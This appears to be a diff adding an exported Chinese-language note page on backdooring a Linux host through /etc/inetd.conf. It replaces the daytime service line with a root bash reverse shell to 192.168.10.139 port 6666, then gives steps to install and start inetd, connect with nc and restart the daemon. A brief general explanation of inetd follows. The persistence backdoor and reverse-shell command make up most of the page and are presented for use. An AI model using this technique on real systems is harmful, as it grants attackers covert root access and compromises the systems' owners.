@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>inetd.conf文件</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>inetd.conf文件</h1><br/>我们使用vi来修改 /etc/inetd.conf 文件<br /><br />原文件：<br />#daytime stream tcp nowait root internal<br /><br />修改为:<br />daytime stream tcp nowait root /bin/bash bash -i &gt;&amp;/dev/tcp/192.168.10.139/6666 0&gt;&amp;1<br /><br />开启inetd：<br /><br />下载<br />apt-get install openbsd-inetd<br />直接输入<br />inetd<br /><br />之后使用nc连接即可<br /><br />如果要强制重启inetd：<br /><br />dawg:~# ps -ef | grep inetdroot <br />362 1 0 Jul22 ? 00:00:00 /usr/sbin/inetdroot <br />13769 13643 0 17:51 pts/1 00:00:00 grep inetd<br />dawg:~# kill -HUP 362<br /><br /><br /><br />inetd是监视一些网络请求的守护进程<br />在这个文件中，你可以添加或删除一个服务，或是在一行前增加一个注释符（如’#’)<br />如果inetd进程在SRC控制下运行，则运行<br />refresh -s inetd<br />命令来让inetd进程重新读取inetd.conf文件中的配置信息.<br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
